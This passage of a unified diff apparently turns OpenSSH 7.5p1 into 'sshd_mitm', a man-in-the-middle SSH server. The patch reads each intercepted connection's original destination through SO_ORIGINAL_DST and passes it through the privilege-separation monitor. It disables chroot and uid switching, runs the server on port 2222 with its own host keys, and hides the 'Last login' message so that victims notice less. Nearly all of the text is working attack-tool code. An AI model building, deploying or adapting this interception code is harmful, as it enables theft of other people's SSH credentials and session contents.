@@ -122,6 +124,7 @@
 #include "ssh-sandbox.h"
 #include "version.h"
 #include "ssherr.h"
+#include "lol.h"
 
 /* Re-exec fds */
 #define REEXEC_DEVCRYPTO_RESERVED_FD	(STDERR_FILENO + 1)
@@ -201,6 +204,9 @@
 	int	have_ssh2_key;
 } sensitive_data;
 
+
+Lol *lol = NULL;
+
 /* This is set to true when a signal is received. */
 static volatile sig_atomic_t received_sighup = 0;
 static volatile sig_atomic_t received_sigterm = 0;
@@ -543,10 +549,13 @@
 	/* Demote the child */
 	if (getuid() == 0 || geteuid() == 0) {
 		/* Change our root directory */
+/* chroot() won't work since we are not running as root. */
+/*
 		if (chroot(_PATH_PRIVSEP_CHROOT_DIR) == -1)
 			fatal("chroot(\"%s\"): %s", _PATH_PRIVSEP_CHROOT_DIR,
 			    strerror(errno));
-		if (chdir("/") == -1)
+*/
+		if (chdir("/home/ssh-mitm/") == -1)
 			fatal("chdir(\"/\"): %s", strerror(errno));
 
 		/* Drop our privileges */
@@ -672,6 +681,7 @@
  skip:
 	/* It is safe now to apply the key state */
 	monitor_apply_keystate(pmonitor);
+	monitor_apply_lol(pmonitor, lol);
 
 	/*
 	 * Tell the packet layer that authentication was successful, since
@@ -1372,6 +1382,18 @@
 	int keytype;
 	Authctxt *authctxt;
 	struct connection_info *connection_info = get_connection_info(0, 0);
+#ifndef DEBUG_HOST
+	struct sockaddr_in origaddr;
+	socklen_t origaddr_len = sizeof(origaddr);
+#endif
+
+	lol = (Lol *)calloc(1, sizeof(Lol));
+
+        /* Terminate if sshd_mitm is running in a privileged account. */
+        if ((getuid() < 500) || (getgid() < 500) || (geteuid() < 500) || (getegid() < 500)) {
+            fprintf(stderr, "Error: sshd_mitm must be run under a non-privileged account!  UID and GID must be >= 500.\n");
+            exit(-1);
+        }
 
 	ssh_malloc_init();	/* must be called before any mallocs */
 
@@ -1780,7 +1802,8 @@
 		    (st.st_uid != getuid () ||
 		    (st.st_mode & (S_IWGRP|S_IWOTH)) != 0))
 #else
-		if (st.st_uid != 0 || (st.st_mode & (S_IWGRP|S_IWOTH)) != 0)
+                /* Ownership of the chroot directory no longer relevant. */
+                if (0)
 #endif
 			fatal("%s must be owned by root and not group or "
 			    "world-writable.", _PATH_PRIVSEP_CHROOT_DIR);
@@ -1956,6 +1979,17 @@
 	signal(SIGCHLD, SIG_DFL);
 	signal(SIGINT, SIG_DFL);
 
+#ifndef DEBUG_HOST
+	if (getsockopt(sock_in, SOL_IP, SO_ORIGINAL_DST, (struct sockaddr *)&origaddr, &origaddr_len) != 0)
+	  fatal("%s: getsockopt failed.", __func__);
+
+	lol->original_host = strdup(inet_ntoa(origaddr.sin_addr));
+	lol->original_port = ntohs(origaddr.sin_port);
+#else
+	lol->original_host = strdup(DEBUG_HOST);
+	lol->original_port = DEBUG_PORT;
+#endif
+
 	/*
 	 * Register our connection.  This turns encryption off because we do
 	 * not have a key.
@@ -2040,6 +2074,7 @@
 	 */
 	if (use_privsep) {
 		mm_send_keystate(pmonitor);
+		mm_send_lol(pmonitor, lol);
 		exit(0);
 	}
 
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd_config openssh-7.5p1-mitm/sshd_config
--- openssh-7.5p1/sshd_config	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshd_config	2017-07-06 12:52:17.029320213 -0400
@@ -10,22 +10,24 @@
 # possible, but leave them commented.  Uncommented options override the
 # default value.
 
-#Port 22
+Port 2222
 #AddressFamily any
 #ListenAddress 0.0.0.0
 #ListenAddress ::
 
-#HostKey /etc/ssh/ssh_host_rsa_key
+HostKey /home/ssh-mitm/etc/ssh_host_rsa_key
 #HostKey /etc/ssh/ssh_host_dsa_key
 #HostKey /etc/ssh/ssh_host_ecdsa_key
-#HostKey /etc/ssh/ssh_host_ed25519_key
+HostKey /home/ssh-mitm/etc/ssh_host_ed25519_key
+
+PrintMotd no
 
 # Ciphers and keying
 #RekeyLimit default none
 
 # Logging
-#SyslogFacility AUTH
-#LogLevel INFO
+SyslogFacility AUTH
+LogLevel INFO
 
 # Authentication:
 
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshlogin.c openssh-7.5p1-mitm/sshlogin.c
--- openssh-7.5p1/sshlogin.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshlogin.c	2017-07-06 12:52:17.029320213 -0400
@@ -113,7 +113,8 @@
 		else
 			snprintf(buf, sizeof(buf), "Last login: %s from %s\r\n",
 			    time_string, hostname);
-		buffer_append(&loginmsg, buf, strlen(buf));
+		/* Suppress message about last login. */
+		/*buffer_append(&loginmsg, buf, strlen(buf));*/
 	}
 # endif /* CUSTOM_SYS_AUTH_GET_LASTLOGIN_MSG */
 #endif /* NO_SSH_LASTLOG */
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/uidswap.c openssh-7.5p1-mitm/uidswap.c
--- openssh-7.5p1/uidswap.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/uidswap.c	2017-07-06 12:52:17.029320213 -0400
@@ -59,6 +59,8 @@
 void
 temporarily_use_uid(struct passwd *pw)
 {
+        /* Since we are never running as root, don't ever try to change uid/gid. */
+	return;
 	/* Save the current euid, and egroups. */
 #ifdef SAVED_IDS_WORK_WITH_SETEUID
 	saved_euid = geteuid();
@@ -134,6 +136,8 @@
 void
 permanently_drop_suid(uid_t uid)
 {
+        /* Since we are never running as root, don't ever try to change uid/gid. */
+	return;
 #ifndef NO_UID_RESTORATION_TEST
 	uid_t old_uid = getuid();
 #endif
@@ -168,6 +172,8 @@
 void
 restore_uid(void)
 {
+        /* Since we are never running as root, don't ever try to change uid/gid. */
+	return;
 	/* it's a no-op unless privileged */
 	if (!privileged) {
 		debug("restore_uid: (unprivileged)");
@@ -205,6 +211,8 @@
 void
 permanently_set_uid(struct passwd *pw)
 {
+        /* Since we are never running as root, don't ever try to change uid/gid. */
+	return;
 #ifndef NO_UID_RESTORATION_TEST
 	uid_t old_uid = getuid();
 	gid_t old_gid = getgid();
